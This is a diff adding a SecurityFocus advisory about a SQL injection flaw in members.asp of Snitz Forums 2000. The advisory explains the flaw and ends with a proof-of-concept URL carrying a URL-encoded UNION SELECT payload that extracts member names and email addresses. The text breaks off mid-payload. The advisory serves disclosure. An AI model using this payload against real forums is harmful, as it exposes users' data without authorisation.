@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/4558/info
+
+Snitz Forums 2000 is ASP-based web forum software. It runs on Microsoft Windows operating systems. Snitz is back-ended by a database and supports Microsoft Access 97/2000, SQL Server 6.5/7.0/2000 and MySQL.
+
+It is possible for a remote attacker to inject SQL into queries made by the members.asp script.
+
+Depending on the database implementation used, this may possibly result in sensitive information information in the database being disclosed or may enable the attacker to modify data. There is also the possibility that this issue may be leveraged to exploit vulnerabilities that may exist in the underlying database. 
+
+Normally, to view the members' list whose
+membername start with 'A', members.asp page is
+used as the following:
+
+/members.asp?
+mode=search&M_NAME=A&initial=1&method=
+
+
+Use this link to view the vulnerability:
+
+/members.asp?mode=search&M_NAME=XXXX%
+25')%20UNION%20SELECT%20MEMBER_ID,%
+20M_STATUS,%20M_NAME%20%2B%20'/'%20%
+2B%20M_EMAIL%20%2B%20'/',%20M_LEVEL,% 
